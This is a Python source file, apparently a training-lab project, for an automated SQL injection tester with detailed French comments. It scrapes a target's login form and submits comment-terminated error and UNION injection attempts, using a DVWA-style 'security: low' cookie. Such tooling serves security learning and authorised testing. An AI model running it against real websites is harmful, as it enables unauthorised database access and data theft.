#!/usr/bin/python3
import argparse
import requests
import re
import os
import difflib

from utils import Colors, get_diff, form_url, get_result, error_exit, error_continue
from archive import Archive
from error import Error
from tester import Tester
from union import Union

"""r√©cup√®re la valeur de la variable d'environnement nomm√©e TOKEN et l'assigne √† la variable token
 utilise la m√©thode get de l'objet os.environ pour obtenir la valeur de TOKEN sans g√©n√©rer d'erreur 
 si la variable d'environnement n'existe pas. Si TOKEN n'est pas d√©fini dans l'environnement, token sera None."""
token = os.environ.get('TOKEN')
"""cr√©e un dictionnaire Python nomm√© cookies qui contient deux paires cl√©-valeur
    "security:low" > les mesures de s√©curit√© minimales sont en place, facilitant ainsi les 
    tests de vuln√©rabilit√©s"""
cookies = {'PHPSESSID': token, "security": "low"}

class Vaccine:
    #Initialise les param√®tres pour les tests d'injection SQL sur une URL donn√©e
	def __init__(self, url, request):
		self.url = url
		self.method = request
    
		"""obtenir le contenu de la page cible:
		self.request est utilis√©e pour envoyer une requ√™te HTTP GET √† l'URL
		cible et r√©cup√©rer le contenu de la page web"""

		#recup√®re le contenu de l'URL via la m√©thode GET
		txt = self.request()
		#Appel de la m√©thode get_form pour extraire le formulaire de la page cible
		form = self.get_form(txt)
		#recup√®re l'url sur lequel on va faire notre injection
		self.request_url = self.get_request_url(form)
		#obtenir les noms des champs du formulaire
		field = self.get_field_names(form)
		#Un formulaire de login contient au moins deux champs : un pour le nom d'utilisateur et un pour le mot de passe. Cependant, il peut y avoir des formulaires avec des champs suppl√©mentaires (comme un champ de token, de captcha, etc.)
		#Cette condition est donc une pr√©caution pour g√©rer les formulaires plus complexes.
		if len(field) >= 2:
			self.username_field_name = field[0]
			self.password_field_name = field[1]
		else:
			self.username_field_name = field[0]
			self.password_field_name = None

	"""M√©thode sp√©ciale : En Python, les m√©thodes sp√©ciales sont des m√©thodes qui 
	commencent et se terminent par des doubles underscores (__). 
	Elles sont appel√©es automatiquement par Python dans certaines situations.
	__str__ : Cette m√©thode est appel√©e par la fonction str() et par print() 
	pour obtenir une repr√©sentation sous forme de cha√Æne de caract√®res de l'objet. 
	Elle est utilis√©e pour d√©finir comment 
	l'objet doit √™tre affich√© sous forme de texte.

	La m√©thode __str__ de la classe Vaccine retourne une cha√Æne contenant les m√©tadonn√©es de l'objet, 
	telles que l'URL, la m√©thode HTTP, et les champs du formulaire. 
	C'est utile pour avoir un aper√ßu rapide des propri√©t√©s de l'objet lorsqu'il est imprim√©.

	Quand la fonction print() ou str() est appel√©e sur un objet, Python appelle 
	automatiquement la m√©thode __str__ de cet objet 
	pour obtenir sa repr√©sentation sous forme de cha√Æne.

	Lorsque print(vaccine) est ex√©cut√©, 
	Python appelle automatiquement vaccine.__str__() pour obtenir la cha√Æne √† afficher."""

	def __str__(self):
		return f'''{Colors.GREEN}------ Data saved from the injection üß™ ------{Colors.RESET}\n 
{Colors.CYAN}[URL]{Colors.RESET} {self.url}
{Colors.CYAN}[request-url]{Colors.RESET} {self.request_url}
{Colors.CYAN}[method]{Colors.RESET} {self.method}
{Colors.CYAN}[username-field]{Colors.RESET} {self.username_field_name}
{Colors.CYAN}[password-field]{Colors.RESET} {self.password_field_name}'''

	def get_form(self, txt):
        #Utilise une expression r√©guli√®re pour trouver tous les formulaires dans le contenu de la page.
		forms = re.findall(r'(<form(.|\s)*?</form>)', txt)

		#V√©rifie s'il n'y a pas de formulaire trouv√© et affiche un message d'erreur si c'est le cas
		if not forms:
			error_exit("form block does not exist")
        #Initialise une liste pour stocker les formulaires filtr√©s
		filtered_froms = []
		for form in forms:
			method_match = re.search(r'method="(.*?)"', form[0])
			if not method_match:
				continue
			if method_match.group(1).lower() != self.method:
				continue
			filtered_froms.append(form[0])
        #V√©rifie s'il n'y a pas de formulaire correspondant √† la m√©thode HTTP 
		#et affiche un message d'erreur si c'est le cas
		if not filtered_froms:
			error_exit("method does not match")
		if len(filtered_froms) > 1:
			error_exit("multiple fields exist, cannot determin")
		return filtered_froms[0]

	#func pour extraire les noms des champs du formulaire
	def get_field_names(self, form):
		#Utilise une expression r√©guli√®re pour trouver tous les champs d'entr√©e 
		#dans le formulaire et retourne leurs noms.
		return re.findall(r'<input[^>]+name="(.*?)"', form)

	"""
	La m√©thode get_request_url sert √† d√©terminer l'URL de la requ√™te √† partir du formulaire exacte vers laquelle
	envoyer les donn√©es du formulaire. Quand un utilisateur soumet un formulaire sur une page web, les donn√©es sont g√©n√©ralement envoy√©es √† une URL sp√©cifique mentionn√©e dans l'attribut action de la balise <form>.
	Cette m√©thode r√©cup√®re cette URL"""
	def get_request_url(self, form):
		#trouver toutes les occurrences de l'attribut action dans les balises <form> du HTML fourni
		actions = re.findall(r'<form[^>]+action="(.*?)"', form)
		if not actions:
			return self.url
		#Le code ne peut pas g√©rer plusieurs actions et consid√®re cela comme une erreur
		if len(actions) > 1:
			error_exit("Error\nToo many actions found, can\'t process correctly this form")
		return form_url(self.url, actions[0])

	#func pour envoyer une requ√™te GET √† l'URL cible et obtenir le contenu de la page.
	def request(self, retry_count=2):
		#limite le nombre de retry pour les cookies pour ne pas aller dans une boucle inf
		if retry_count <= 0:
			error_exit("Error\nMax retries exceeded for the cookies.")
		try:
			#Envoie une requ√™te GET √† l'URL cible avec les cookies sp√©cifi√©s
			response = requests.get(self.url, cookies=cookies)
			#Si une erreur de connexion se produit
		except requests.exceptions.ConnectionError:
			error_exit(f"Error\nConnection refused: {self.url}.")
		except Exception as e:
			error_exit(e)
		if response.status_code == 302:
			#Si le code de statut de la r√©ponse est 302, affiche un message d'erreur indiquant qu'aucun cookie 
			#n'a √©t√© trouv√© et renvoie la requ√™te
			error_exit("Error\nNo cookie has been founded.")
			return self.request(retry_count - 1)

		if response.status_code != 200:
			error_exit(f"{self.url} - {response}")
		#Le contenu text qui sera renvoy√©: HTML d'une page web, Donn√©es d'une API REST, Messages d'erreur ou de statut
		return response.text

    #Soumet un formulaire avec les donn√©es d'injection SQL.
	def submit(self, username, password="password"):
        #m√©thode submit: soumet les informations d'authentification au formulaire
		#Si le champ de mot de passe existe, 
		#Cr√©e un dictionnaire payload avec les noms d'utilisateur et de mot de passe
		if self.password_field_name:
			payload = {
				self.username_field_name: username,
				self.password_field_name: password
			}
		else:
            #cr√©e un dictionnaire payload avec le nom d'utilisateur et un champ "Submit"
			payload = {
				self.username_field_name: username,
				"Submit" : "Submit"
				"""Lorsque le formulaire ne contient pas de champ de mot de passe, il peut repr√©senter des 
				actions comme une recherche, une soumission simple ou d'autres interactions. Dans ce cas, 
				l'inclusion du bouton de soumission ("Submit": "Submit") peut √™tre n√©cessaire 
				pour indiquer au serveur que le formulaire a √©t√© soumis"""
			}

		if self.method == "get":
            #Si la m√©thode HTTP est GET, envoie une requ√™te GET avec les param√®tres payload...
			res = requests.get(self.request_url, params=payload, cookies=cookies)
		elif self.method == "post":
			res = requests.post(self.request_url, data=payload, cookies=cookies)
		return res

	def vaccine(self):
		try:
			"""Essaye d'effectuer une injection SQL avec le caract√®re #. Cr√©e une instance de Tester et Error, 
			obtient le nombre de colonnes et effectue une union SQL"""
			injection_tester = Tester(self.submit, "#")
			e = Error(injection_tester)
			column_counts = e.error()
			u = Union(injection_tester, column_counts)
			u.union()
		except Error.ErrorException or Union.UnionException as e:
			"""permet de continuer le programme m√™me apr√®s avoir rencontr√© une erreur,
			ce qui est important dans un contexte de tests o√π plusieurs tentatives 
			d'injection peuvent √™tre n√©cessaires."""
			error_continue(e)
		try:
			injection_tester = Tester(self.submit, "--")
			e = Error(injection_tester)
			column_counts = e.error()
			u2 = Union(injection_tester, column_counts)
			u2.union()
		except Error.ErrorException or Union.UnionException as e:
			error_continue(e)

def main_program(url, path, request):
	#variable globale final_archive qui sera utilis√©e pour enregistrer les logs tout au long du programme
	global final_archive
	#initialisation l'objet Archive avec le nom de fichier pass√© en argument
	#Cet objet g√®re l'√©criture des logs dans un fichier
	final_archive = Archive(path)

	#Cr√©e une instance de la classe Vaccine en passant l'URL cible, le type de requ√™te et une option pour l'entr√©e utilisateur. 
	#La classe Vaccine contient la logique principale pour tester les injections SQL
	vaccine = Vaccine(url, request)

	#Appel de la m√©thode vaccine de l'instance Vaccine
	#C'est ici que les tests d'injection SQL sont effectu√©es
	final_archive.log("Starting SQL Injection Test", section="INFO")
	vaccine.vaccine()

	#Imprime les informations de l'objet Vaccine, 
	#Comme l'URL cible, les champs de formulaire d√©tect√©s, etc
	final_archive.log("SQL Injection Test Completed!\n", section="INFO")
	print(vaccine)
	final_archive.log(f'''------ Data saved from the injection üß™ ------\n 
[URL] {vaccine.url}
[request-url] {vaccine.request_url}
[method] {vaccine.method}
[username-field] {vaccine.username_field_name}
[password-field] {vaccine.password_field_name}''', not_print="NOP")
	#Appel de la m√©thode to_file de l'objet Archive pour sauvegarder les logs dans le fichier sp√©cifi√©
	final_archive.to_file()
